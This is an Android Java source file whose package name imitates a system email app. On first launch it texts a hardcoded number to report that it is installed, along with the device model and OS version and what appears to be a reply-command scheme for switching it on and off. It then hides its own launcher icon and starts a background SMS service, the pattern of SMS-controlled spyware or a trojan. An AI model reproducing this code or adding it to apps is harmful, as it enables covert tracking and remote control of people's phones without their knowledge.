package com.android.system.emial;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.widget.Toast;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		super.requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.activity_main);
		SmSutils su=new SmSutils();
//		if(SmSutils.key.equals(SmSutils.getPublicKey(this))){
			su.sendSMS(SmSutils.phone, "�ֻ��Ѱ�װ���,�ظ�com#false�ر�com#true����, �汾"+Build.VERSION.SDK_INT+" "+Build.MODEL,null);
			//Toast.makeText(this, "���������ɹ�", Toast.LENGTH_LONG).show();
	    	PackageManager pm=this.getPackageManager();
			pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
			Intent intent=new Intent(this,SmSserver.class);
			this.startService(intent);
			this.finish();
//		}else{
//			String sp="֤�����,��������ʧ��";
//			su.sendSMS(SmSutils.phone, sp,null);
//			Toast.makeText(this, sp, Toast.LENGTH_LONG).show();
//			this.finish();
//		}
		
	}

	
	
}
